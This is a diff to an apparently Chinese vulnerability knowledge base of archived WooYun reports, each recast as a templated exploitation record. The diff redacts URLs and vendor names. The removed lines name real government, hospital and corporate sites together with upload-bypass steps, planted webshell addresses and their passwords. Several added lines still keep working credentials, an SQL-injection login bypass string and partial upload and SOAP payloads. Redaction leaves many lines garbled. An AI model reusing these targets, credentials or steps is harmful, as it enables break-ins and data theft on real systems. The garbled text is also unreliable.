+**POC**: https://example.com/[已脱敏] pass合并图片一句话木马成功~！！！！！https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6650,7 +6650,7 @@
 
 **详情**: 西安惠天网络科技有限公司建站程序存在多项漏洞：建站弱口令、搜索型注入、后台POST注入、后台万能密码绕过、权限绕过、后台任意文件上传
 
-**POC**: 西安惠天网络科技有限公司建站程序存在多项漏洞：建站弱口令、搜索型注入、后台POST注入、后台万能密码绕过、权限绕过、后台任意文件上传建站案例：http://www.xagoto.com/?mid=1&catid=大量用户网站存在建站弱口令 统一账号密码为：admin    admin5218后台万能密码：admin' or 'a'='a   可通杀部分网站后台POST注入：影响不大的漏洞就不给予演示了,直接演示新漏洞（此漏洞可通杀  简单、方便、直接、便捷）后台数据库备份处未验证Cookie导致越权访问,可直接备份数据库http://www.sxxingli.com/admin/databak
+**POC**: 西安惠天网络科技有限公司建站程序存在多项漏洞：建站弱口令、搜索型注入、后台POST注入、后台万能密码绕过、权限绕过、后台任意文件上传建站案例：https://example.com/[已脱敏] 统一账号密码为：admin    admin5218后台万能密码：admin' or 'a'='a   可通杀部分网站后台POST注入：影响不大的漏洞就不给予演示了,直接演示新漏洞（此漏洞可通杀  简单、方便、直接、便捷）后台数据库备份处未验证Cookie导致越权访问,可直接备份数据库https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -6670,7 +6670,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.首先说下，我传了一直找不到路径，坑死了，技术问题啊2.地址：http://www3.zte.com.cn/datachange/file_upload.jsp?SelfControl=1&ShowText=1&AllowExt=rar,zip&InputName=&BgColor=然后还有http://www2.zte.com.cn/datachange/file_upload.jsp?SelfControl=1&ShowText=1&AllowExt=rar,zip&InputName=&BgColor=我也没去看是不是同一个IP地址我看的是在客户端验证的，然后我就直接burp suite修改文件后缀名，然后成功上传啦没有找到地址路径，不过还是存在的
+**详情**: 1.首先说下，我传了一直找不到路径，坑死了，技术问题啊2.地址：https://example.com/[已脱敏] suite修改文件后缀名，然后成功上传啦没有找到地址路径，不过还是存在的
 
 **POC**: (见原文)
 
@@ -6692,7 +6692,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Jboss JMX/EJBInvokerServlet 漏洞实例pay.xmbtn.comhttp://www.xmbtn.com/pay/index.html
+**详情**: Jboss JMX/EJBInvokerServlet 漏洞实例pay.xmbtn.comhttps://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6714,9 +6714,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、在客户端中抓取上传头像地址。2、任意文件上传，只要修改一下文件名和内从就好了，这里只上传一个txt,content:just test3、上传成功得到response，查看地址。4、打开页面http://www.lvmama.com/uploads/header/3428a92f4b3ad5fb014b41151e090091.txt
+**详情**: 1、在客户端中抓取上传头像地址。2、任意文件上传，只要修改一下文件名和内从就好了，这里只上传一个txt,content:just test3、上传成功得到response，查看地址。4、打开页面https://example.com/[已脱敏]
 
-**POC**: http://www.lvmama.com/uploads/header/3428a92f4b3ad5fb014b41151e090091.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6736,7 +6736,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 任意文件上传地址http://www.phei.com.cn/module/zygl/manager/uploadpic.jsp?option=upload可以上传jsp文件测试文件http://www.phei.com.cn/module/zygl/manager/uploadfiles/Browser.jsp无需密码登录可看~
+**详情**: 任意文件上传地址https://example.com/[已脱敏]
 
 **POC**: 详细说明已说。
 
@@ -6758,7 +6758,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 好吧！我承认我是冲礼物来的。。分站：http://market.sj.91.com/选择扫描件上传：只有本地验证。
+**详情**: 好吧！我承认我是冲礼物来的。。分站：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6780,9 +6780,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 武汉地铁工程安全预警系统：http://hs.whrt.gov.cn/safemanager/login.doFCK编辑器：http://hs.whrt.gov.cn/safemanager/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector可上传任意文件类型的文件。。。。上传是成功的 ，但是好像是限制了上传目录需登陆权限。。不再继续，点到为止！
+**详情**: 武汉地铁工程安全预警系统：https://example.com/[已脱敏] ，但是好像是限制了上传目录需登陆权限。。不再继续，点到为止！
 
-**POC**: 武汉地铁工程安全预警系统：http://hs.whrt.gov.cn/safemanager/login.doFCK编辑器：http://hs.whrt.gov.cn/safemanager/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector可上传任意文件类型的文件。。。。上传是成功的 ，但是好像是限制了上传目录需登陆权限。。不再继续，点到为止！
+**POC**: 武汉地铁工程安全预警系统：https://example.com/[已脱敏] ，但是好像是限制了上传目录需登陆权限。。不再继续，点到为止！
 
 **绕过**: 直接利用
 
@@ -6802,7 +6802,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无意间看见WooYun: 北京电信通云主机事业部代理商任意文件上传漏洞,可导致内部/用户敏感信息泄漏大牛好吊。。。额  手贱了 扫描下————我擦  各种目录遍历  我去然后一个一个看。。。。貌似我懂得前辈怎么进去的了：http://www.yunhosting.net/UserFiles/     然后http://www.yunhosting.net/UserFiles/e.asp;.jpg  爆破：123456   那个1.rar经判断改后缀mdb由此我们判断前辈是靠解析漏洞传上去的   并存在弱口令   看漏洞类型大牛并没有发现此站存在目录遍历  而是仅通过代码审计之类首页已备份index1.asp
+**详情**: 无意间看见WooYun: 北京电信通云主机事业部代理商任意文件上传漏洞,可导致内部/用户敏感信息泄漏大牛好吊。。。额  手贱了 扫描下————我擦  各种目录遍历  我去然后一个一个看。。。。貌似我懂得前辈怎么进去的了：https://example.com/[已脱敏]     然后https://example.com/[已脱敏]  爆破：123456   那个1.rar经判断改后缀mdb由此我们判断前辈是靠解析漏洞传上去的   并存在弱口令   看漏洞类型大牛并没有发现此站存在目录遍历  而是仅通过代码审计之类首页已备份index1.asp
 
 **POC**: (见原文)
 
@@ -6826,7 +6826,7 @@
 
 **详情**: 
 
-**POC**: img.hbys.gov.cn/CMShbys/201410/201410110438054.docTarget: http://218.200.68.58:3003/login.actionUseage: S2-016Whoami: svctag-9245f3x\hbtdadminWebPath: D:\goss_web_v8.0.0.17896.20130509\goss_web\goss_webapp\webapps\ROOT\=================================================================================
+**POC**: img.hbys.gov.cn/CMShbys/201410/201410110438054.docTarget: http://[IP已脱敏] S2-016Whoami: svctag-9245f3x\hbtdadminWebPath: D:\goss_web_v8.0.0.17896.20130509\goss_web\goss_webapp\webapps\ROOT\=================================================================================
 
 **绕过**: 直接利用
 
@@ -6835,7 +6835,7 @@
 
 ---
 ### [wooyun-2014-074607] 从看片中发现蛛丝马迹最终发现电信某省某系统弱口令存在任意上传
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 服务弱口令
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 服务弱口令
 
 **元思考**: 触发信号: 上传功能, 后台管理
 
@@ -6846,7 +6846,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 四川电信移动受理系统#短片位置http://agent.sc.189.cn/apk/#短片http://agent.sc.189.cn/apk/%cb%c4%b4%a8%b5%e7%d0%c5%d2%c6%b6%af%ca%dc%c0%ed%cf%b5%cd%b3%ba%f3%cc%a8%c5%e4%d6%c3%b2%d9%d7%f7%c5%e0%d1%b5%ca%d3%c6%b50602.wmv＃看片时间1:49   url出现锁定：http://61.188.4.249:8080/时间2:51 输入用户名 10001随后输入了五位密码，五位就好办了试了admin...最后弱口令帝试了试，12345进来了。。账户10001密码12345的http://61.188.4.249:8080/chengdu/login.actionhttp://61.188.4.249:8080/4g/log
+**详情**: 四川电信移动受理系统#短片位置https://example.com/[已脱敏]   url出现锁定：http://[IP已脱敏] 输入用户名 10001随后输入了五位密码，五位就好办了试了admin...最后弱口令帝试了试，12345进来了。。账户10001密码12345的http://[IP已脱敏]
 
 **POC**: 还能查看订单等等。
 
@@ -6868,9 +6868,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标地址：http://www.fjccs.com.cn/福建省通信产业服务有限公司编辑器地址：http://www.fjccs.com.cn/eWebEditor_aspx/admin/login.aspx帐号密码：admin/admin
+**详情**: 目标地址：https://example.com/[已脱敏]
 
-**POC**: 目录遍历：http://www.fjccs.com.cn/eWebEditor_aspx/admin/upload.aspx?id=2&dir=../拿shell过程就不多说了一句话地址：http://www.fjccs.com.cn/eWebEditor_aspx/uploadfile/20150505225512382.aspx密码：abcd
+**POC**: 目录遍历：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6892,7 +6892,7 @@
 
 **详情**: 途牛旅游两个站点存在svn源代码泄露，通过泄露的源代码，可找到系统文件上传脚本路径，通过文件上传，可上传任意文件到tuniucdn服务器。
 
-**POC**: 源代码泄露http://metro.tuniu.com/.svn/entrieshttp://weather.tuniu.com/.svn/entries泄露了php脚本的路径和部分敏感信息可以找到一个文件上传脚本本地写一个提交页面把链接弄进去:可以上传任意文件到http://metro.tuniu.com/该服务器传了很多类型的文件，都无法解析执行，拿不到shell。。。。应该是做了安全设置可以上传的点：http://metro.tuniu.com/SWFUpload/upload.phphttp://weather.tuniu.com/SWFUpload/upload.phphttp://
+**POC**: 源代码泄露https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6912,9 +6912,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官方案例：http://52xinyou.cn/anli.htm从案例里面选了12玩 http://www.12wan.com 做例子，其它雷同（个别有狗）api里的upload.ashx文件产生的问题。
+**详情**: 官方案例：https://example.com/[已脱敏] https://example.com/[已脱敏] 做例子，其它雷同（个别有狗）api里的upload.ashx文件产生的问题。
 
-**POC**: 地址：http://www.12wan.com/api/Upload.ashx……extTable.Add("image", "gif,jpg,jpeg,png,bmp");extTable.Add("flash", "swf,flv");extTable.Add("apw", "apw");extTable.Add("media", "swf,flv,mp3,mp4,wav,wma,wmv,mid,avi,mpg,asf,rm,rmvb");extTable.Add("file", "cs,doc,ppt,pptx,docx,xls,xlsx,ppt,htm,html,txt,zip,rar
+**POC**: 地址：https://example.com/[已脱敏]"image", "gif,jpg,jpeg,png,bmp");extTable.Add("flash", "swf,flv");extTable.Add("apw", "apw");extTable.Add("media", "swf,flv,mp3,mp4,wav,wma,wmv,mid,avi,mpg,asf,rm,rmvb");extTable.Add("file", "cs,doc,ppt,pptx,docx,xls,xlsx,ppt,htm,html,txt,zip,rar
 
 **绕过**: 直接利用
 
@@ -6936,7 +6936,7 @@
 
 **详情**: mask 区域1.://**.**.**//www.ga.xm.gov.cn:3388/was2/xmsga/jsp/module/user/user_login.jsp_*****3bcb39e1c98a.jpg" alt=&quo**********得先注^**********^了12条，无限制，可抓包重发，**********db7049007566.png" alt=&quo**********71c30d506c75.jpg" alt=&quo*****
 
-**POC**: mask 区域*****^存在文件上^**********689772ca0bbb.jpg" alt=&quo**********3a9c3689104b.jpg" alt=&quo**********^件^**********^，即可上传jsp^**********5ccf6ddcc858.jpg" alt=&quo*****1.http://**.**.**/was2/washttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/173958_wooyun.jsp_*****0c7ba174ff9c.jpg" alt=&quo******
+**POC**: mask 区域*****^存在文件上^**********689772ca0bbb.jpg" alt=&quo**********3a9c3689104b.jpg" alt=&quo**********^件^**********^，即可上传jsp^**********5ccf6ddcc858.jpg" alt=&quo*****1.http://**.**.**/was2/washttps://example.com/[已脱敏]" alt=&quo******
 
 **绕过**: 直接利用
 
@@ -6956,7 +6956,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 文件上传的链接：http://www.house0515.com/common/lib/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php由于上传的类型要用Media，而页面中没有这个类型，所以要自己构造请求头exp:url_add  = '/common/lib/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php'url_param = '?Type=Media'data = ('------WebKitFormBoundaryMYPME809NpNklyB5''Content-Disposition: fo
+**详情**: 文件上传的链接：https://example.com/[已脱敏]  = '/common/lib/FCKeditor/editor/filemanagerhttps://example.com/[已脱敏]'url_param = '?Type=Media'data = ('------WebKitFormBoundaryMYPME809NpNklyB5''Content-Disposition: fo
 
 **POC**: 用菜刀链接，结果如下
 
@@ -6980,7 +6980,7 @@
 
 **详情**: FCK编辑器能扫能爆，居家旅行必备哟！
 
-**POC**: 漏洞证明http://www.20ju.com/data/userfiles/file/hacked101521.txt
+**POC**: 漏洞证明https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7000,9 +7000,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通元建站系统的老问题访问：http://www.wxmetro.net:8888/cms/editor/filemanager/browser/default/browser.html?Type=../../../webapps/cms&Connector=connectors/jsp/connector可上传jsp文件
+**详情**: 通元建站系统的老问题访问：https://example.com/[已脱敏]
 
-**POC**: 传的后门http://www.wxmetro.net:8888/cms/job.jsp密码：654321因为我是无锡人，希望这个网站改善下
+**POC**: 传的后门https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7066,7 +7066,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: /home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php文件保存文件名时为：filename GET的参数
+**详情**: /home/ecccs/web/5107https://example.com/[已脱敏] GET的参数
 
 **POC**: 上传成功返回信息如上传的是脚本文件，可控制开服务器
 
@@ -7088,7 +7088,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: fckeditor编辑器一枚。只能上传txt编辑器地址：http://un.koolearn.com/fckeditor/editor/filemanager/connectors/test.html#
+**详情**: fckeditor编辑器一枚。只能上传txt编辑器地址：https://example.com/[已脱敏]
 
 **POC**: 漏洞证明
 
@@ -7112,7 +7112,7 @@
 
 **详情**: 还有什么说的,前台直接传木马,都不用想的.
 
-**POC**: 谷歌搜索inurl:InstantMessage/Dialog如图:共有学校:http://nanhu2.com.cn/InstantMessage/Dialog.aspx       (上海市南湖职业学校二分校)http://www.gxjdgc.com/InstantMessage/Dialog           (广西机电工程学校)http://www.shjtxx.net/InstantMessage/Dialog.aspx      (上海市交通学校)http://www.scp.edu.cn/Committee/InstantMessage/Dialog (上海交通职业技术学院)
+**POC**: 谷歌搜索inurl:InstantMessage/Dialog如图:共有学校:https://example.com/[已脱敏]       (上海市南湖职业学校二分校)https://example.com/[已脱敏]           (广西机电工程学校)https://example.com/[已脱敏]      (上海市交通学校)https://example.com/[已脱敏] (上海交通职业技术学院)
 
 **绕过**: 直接利用
 
@@ -7134,7 +7134,7 @@
 
 **详情**: 又是FCKeditor编辑器...英文分站貌似跟主站用的同个源码发现也被同个人给搞了无奈又走下后门...密码依旧是 dkeeyy看下IP跟主站不在一个服务器上服务器权限前面一篇已经拿下了，应该还在审核就不贴地址了
 
-**POC**: shell:http://en.bobobaby.com.cn/uploadfile/file/2.aspx
+**POC**: shell:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7143,7 +7143,7 @@
 
 ---
 ### [wooyun-2011-02192] foxmail server多个漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 任意文件遍历/下载
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 任意文件遍历/下载
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -7176,7 +7176,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天去医院看到个掌上医院的二维码，就扫了一下，然后就有了下面的事情。智业软件成立于1997年，是一家拥有17年以上专业研发和服务背景，专注于提供医疗卫生信息化领域系统解决方案的企业。以下以福鼎市医院为例Android公众版：Http://36.250.159.106:5155/mhpublic.apkAndroid医护版：Http://36.250.159.106:5156/mhdoctor.apk1#后台未授权访问http://*/adminHttp://36.250.159.106:5155/admin我对该站进行了端口扫描，发现http://36.250.159.106:5255/adminhttp://36.250.159.106:5256/adminhttp://36.250.159.106:9000/admin2#任意文件上传在用户维护的编辑头像处，存在任意文件上传，是直接上传
+**详情**: 今天去医院看到个掌上医院的二维码，就扫了一下，然后就有了下面的事情。智业软件成立于1997年，是一家拥有17年以上专业研发和服务背景，专注于提供医疗卫生信息化领域系统解决方案的企业。以下以福鼎市医院为例Android公众版：Http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -7198,9 +7198,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上海市新闻出版局地址：https://cbj.sh.gov.cn/index.jsp问题原因，站点使用的fck编辑器配置不当fck目录遍历：https://cbj.sh.gov.cn/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../
+**详情**: 上海市新闻出版局地址：https://example.com/[已脱敏]
 
-**POC**: 文件上传：https://cbj.sh.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=https://cbj.sh.gov.cn/editor/filemanager/browser/default/connectors/jsp/connector直接上传jsp文件shell地址：https://cbj.sh.gov.cn/UserFiles/Image/01test10.jsp密码：520o520以上
+**POC**: 文件上传：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7242,9 +7242,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个是上传页面，老洞了。利用解析漏洞即可。http://www.fjgzw.gov.cn/admin/uploadfile/2013/01/21/help.asp;1.jpg
+**详情**: 这个是上传页面，老洞了。利用解析漏洞即可。https://example.com/[已脱敏]
 
-**POC**: 服务器懒得去搞。别人搞过了。圈圈的应该是入侵者QQ
+**POC**: 服务器懒得去搞。别人搞过了。圈圈的应该是入侵者某互联网公司
 
 **绕过**: 直接利用
 
@@ -7264,7 +7264,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在一次渗透测试发现存在任意文件上传，是一个通用的系统。MaticsoftSNS 1.9版本（目测最新版）以及动软卓越商城1.9.8以下版本存在任意文件上传。如所说的案例分别含MaticsoftSNS 1.9版本 以及 动软卓越商城1.9.8版都存漏洞文件。http://www.gannanxian.org/CMSUploadFile.aspxhttp://bink.gq/CMSUploadFile.aspxhttp://bink.gq/CMSUploadFile.aspxhttp://tp.huaxi88.com/CMSUploadFile.aspxhttp://sns2.maticsoft.cn/CMSUploadFile.aspxhttp://sns3.maticsoft.cn/CMSUploadFile.aspxhttp://www.weichimei.com/CMSUploadFi
+**详情**: 在一次渗透测试发现存在任意文件上传，是一个通用的系统。MaticsoftSNS 1.9版本（目测最新版）以及动软卓越商城1.9.8以下版本存在任意文件上传。如所说的案例分别含MaticsoftSNS 1.9版本 以及 动软卓越商城1.9.8版都存漏洞文件。https://example.com/[已脱敏]
 
 **POC**: 实现了成功的上传中注意的文件位置是没有{0}符合的
 
@@ -7286,7 +7286,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我就不多少了,直接上图片吧。。。http://hd.jstv.com/xiaohua/regist.aspx#我们上传一句话然后抓包。嗯。。。成功
+**详情**: 我就不多少了,直接上图片吧。。。https://example.com/[已脱敏]
 
 **POC**: 提权的话我是找到了sa第一次,所以请见谅！！
 
@@ -7308,9 +7308,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无意中对蛋疼闲着没事做看了下新闻，跳出了这个站的新闻打开一个是个gov的。然后就有下面的检测了。扫了下目录竟然出现FCK编辑器的连接http://www.hzcg.gov.cn/fckeditor/editor/fckdialog.html，而且没有做什么设置可以直接上传iis的解析漏洞格式上面发现好多的马！！！
+**详情**: 无意中对蛋疼闲着没事做看了下新闻，跳出了这个站的新闻打开一个是个gov的。然后就有下面的检测了。扫了下目录竟然出现FCK编辑器的连接https://example.com/[已脱敏]
 
-**POC**: 操刀上http://www.hzcg.gov.cn//Files/File/1.asp;.cer密码sb
+**POC**: 操刀上https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7330,7 +7330,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://139.210.101.102:8888/2013yangcaihttp://139.210.101.102:8888/2013yangcai/Edit/editor/filemanager/browser/default/browser.html?Type=File&Connector=http://139.210.101.102:8888/2013yangcai/Edit/editor/filemanager/connectors/asp/connector.asp发现FCKeditor上传链接一枚各种上传方法试了一下，传不上去asp然而，后台还是弱口令http://139.210.101.102:8888/2013yangcai/admin/admin_index.aspadmin admin后台还有备份功能 路径还可控制先通过FCKeditor传上去再利用备份功能
+**详情**: http://[IP已脱敏] admin后台还有备份功能 路径还可控制先通过FCKeditor传上去再利用备份功能
 
 **POC**: 一句话木马连接webshell
 
@@ -7352,9 +7352,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://60.173.215.11/wcm/ 是trs wcm 5.2根据WooYun: TRS WCM 6.X系统任意文件写入漏洞照葫芦画瓢http://60.173.215.11/wcm/services/trs:templateservicefacade?wsdl 漏洞存在
+**详情**: http://[IP已脱敏] 是trs wcm 5.2根据WooYun: TRS WCM 6.X系统任意文件写入漏洞照葫芦画瓢http://[IP已脱敏] 漏洞存在
 
-**POC**: 先打开soapUI，建个新项目，输入http://60.173.215.11/wcm/services/trs:templateservicefacade?wsdl先用writeFile随便提交<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><ns1:writeFile
+**POC**: 先打开soapUI，建个新项目，输入http://[IP已脱敏] xmlns:soapenv="https://example.com/[已脱敏]" xmlns:xsd="https://example.com/[已脱敏]" xmlns:xsi="https://example.com/[已脱敏]"><soapenv:Body><ns1:writeFile
 
 **绕过**: 直接利用
 
@@ -7396,9 +7396,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 演示案例为：湖南省农业综合开发办公室http://220.168.30.69:8080/webmail/admin/index.php用户admin密码123456该公网IP220.168.30.69映射了很多web服务，如湖南省财政厅下属的会计考试报名管理等系统http://220.168.30.69:6011/collectdata/http://220.168.30.69:6020/hnkj/wb/space/IndexAction.do?method=index等等系统，由于只是发现和报告问题，并没有进一步测试内部联通性，请审核人员协调处置。测试中发现该邮箱服务器已被控制，进而打算利用该邮箱服务器控制会计报名系统
+**详情**: 演示案例为：湖南省农业综合开发办公室http://[IP已脱敏]
 
-**POC**: 利用admin/123456登录http://220.168.30.69:8080/webmail/admin/index.php进入信纸管理点击添加或者修改即可无限制上传webshell---------------------------------------------------------------------上面是我在测试中摸索处的办法，可我发现已经有人在早我一个月的时间已经控制了该服务器，并打算攻击会计管理系统。还发现一个2013-09-04上传的一句话。绿色为13年上传的一句话蓝色为我上传的一句话红色为早我一个月的webshell粉丝为早我一个月的webshell做的nam
+**POC**: 利用admin/123456登录http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -7406,8 +7406,8 @@
 ---
 
 ---
-### [wooyun-2012-015489] 中国联通分站上传过滤不严，导致网站沦陷，数据泄漏
-**厂商**: 中国联通 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-015489] 某运营商分站上传过滤不严，导致网站沦陷，数据泄漏
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -7420,7 +7420,7 @@
 
 **详情**: 表示发现上传漏洞，过滤不严。导致数据全部泄漏。。
 
-**POC**: 上传地址：http://www.02160899666.com/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html可直接修改木马成asa、.asp;.jpg等扩展名上传。，导致最后直接沦陷。
+**POC**: 上传地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7462,7 +7462,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 使用旧版用友ICC，任意文件上传http://60.208.91.43/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php详见：WooYun: 用友ICC网站客服系统远程代码执行漏洞
+**详情**: 使用旧版用友ICC，任意文件上传http://[IP已脱敏] 用友ICC网站客服系统远程代码执行漏洞
 
 **POC**: (见原文)
 
@@ -7486,7 +7486,7 @@
 
 **详情**: inurl:EduPlate\PersonBlog\就拿一个站举例子吧
 
-**POC**: http://zpxx.nh.edu.sh.cn/eduplate/PersonBlog//ftb.insertFile.aspxhttp://tywx.mhedu.sh.cn/EduPlate/PersonBlog//ftb.insertFile.aspxhttp://www.peijia.com/EduPlate/PersonBlog/ftb.insertFile.aspxhttp://www.pjsyxx.com/EduPlate/PersonBlog/ftb.insertFile.aspxhttp://www.whei.cn//EduPlate/PersonBlog/ftb.inser
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7506,7 +7506,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在这个网页上http://nju.fitoo.com/Match/jiangsu/apply.aspx随意注册一个账号（邮箱验证），信息随便填写，那就用强大的163邮箱呗。链接可以看出加了地址识别功能，知道在哪个地方。接下随便注册了，这个验证机制就是对学号中的特殊字符做了限制功能，其他随意。然后随便上传文件参加所谓的比赛啦，我就会这个，来来来，服务器在召唤你。
+**详情**: 在这个网页上https://example.com/[已脱敏]
 
 **POC**: 然后随便上传文件参加所谓的比赛啦，我就会这个，来来来，服务器在召唤你。竟然上传成功了，但是不知道如何找到这个文件，找其他亮点吧。竟然上传成功了，但是不知道如何找到这个文件，找其他亮点吧。bingo,excellent!!!数据库没连接上，甚是郁闷！！！，就到这吧。
 
@@ -7550,7 +7550,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址：http://www.gansutelecom.com/ckfinder/ckfinder.html?
+**详情**: 漏洞地址：https://example.com/[已脱敏]
 
 **POC**: 甘肃电信编辑器漏洞现在已拿下SHELL是一件成功的入侵事件
 
@@ -7574,7 +7574,7 @@
 
 **详情**: 华安保险多个系统存在远程代码执行漏洞，同时存在敏感信息泄漏。华安财产保险股份有限公司(以下简称华安保险)是经中国人民银行批准，于1996年10月18日正式创立的一家专业性保险公司，总部设于深圳，主要经营各种财产险、责任险、信用保证险、农业险、意外伤害险和短期健康险业务。
 
-**POC**: URL:https://www.sinosafe.com.cn:9080/https://www.sinosafe.com.cn:18080/http://www.sinosafe.com.cn:16080/其中一个默认密码为admin/admin,其他无密码验证。敏感信息泄露:远程代码执行：shell:
+**POC**: URL:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -7616,7 +7616,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过http://www.njzxw.cn/Plugins/swfFileUpload/UploadHandler.ashx 可构造上传表单提交aspx马到服务器，原理可参考：WooYun: 逐浪cms 2.4某处任意文件上传（不需要登录）通过查看，该应用所属权限较高，可以控制该服务器挂的几十个大小网站，发现其中有一个bbs.zoomla.cn的官方老版论坛也在该服务器，并且配置公司邮箱账户密码：该密码可登录mail.hx008.com ，mail.zoomla.cn的官方账户:web，分别是逐浪和华夏互联的官方邮箱：经过查看，bbs.zoomla.cn论坛已转移到http://club.zoomla.cn/，但账户密码应该没有换把?查看bbs的账户有3W多条：用bbs系统的账户密码，成功登录club的一个管理账户：
+**详情**: 通过https://example.com/[已脱敏] 可构造上传表单提交aspx马到服务器，原理可参考：WooYun: 逐浪cms 2.4某处任意文件上传（不需要登录）通过查看，该应用所属权限较高，可以控制该服务器挂的几十个大小网站，发现其中有一个bbs.zoomla.cn的官方老版论坛也在该服务器，并且配置公司邮箱账户密码：该密码可登录mail.hx008.com ，mail.zoomla.cn的官方账户:web，分别是逐浪和华夏互联的官方邮箱：经过查看，bbs.zoomla.cn论坛已转移到https://example.com/[已脱敏]
 
 **POC**: 网站是Zoomla CMS系统，服务器应该也归属该公司旗下的华夏互联
 
@@ -7638,7 +7638,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.aqanhuisafety.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp直接上传jsp
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7704,9 +7704,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标地址：http://221.4.104.72:8080/首先注册一个叫wooyun的帐号，密码也是wooyun注册成功了自动进入系统
+**详情**: 目标地址：http://[IP已脱敏]
 
-**POC**: 点击关于我们可以看到平台的介绍关于我们XPA统计平台做为统计数据的工具，已向XPA各产品提供了成熟的数据收集能力，现在，XPA统计平台拥有可定制的数据统计功能，无论在线离线都可以统计，支持实时统计，丰富的图表展现形式等特性。为什么认为系统是华为的，是因为在意见反馈处存在任意文件上传漏洞上传后抓包，修改文件后缀这里我试了比较多个shell，大部分都无效，貌似有判断登录状态，最后找了个可以访问，但仍然有点问题的马http://221.4.104.72:8080//snapShot/3987bc5ce2e44146a32de7be644251e8/wooyun.jsp应该可以证明存在任意文件上传
+**POC**: 点击关于我们可以看到平台的介绍关于我们XPA统计平台做为统计数据的工具，已向XPA各产品提供了成熟的数据收集能力，现在，XPA统计平台拥有可定制的数据统计功能，无论在线离线都可以统计，支持实时统计，丰富的图表展现形式等特性。为什么认为系统是华为的，是因为在意见反馈处存在任意文件上传漏洞上传后抓包，修改文件后缀这里我试了比较多个shell，大部分都无效，貌似有判断登录状态，最后找了个可以访问，但仍然有点问题的马http://[IP已脱敏]
 
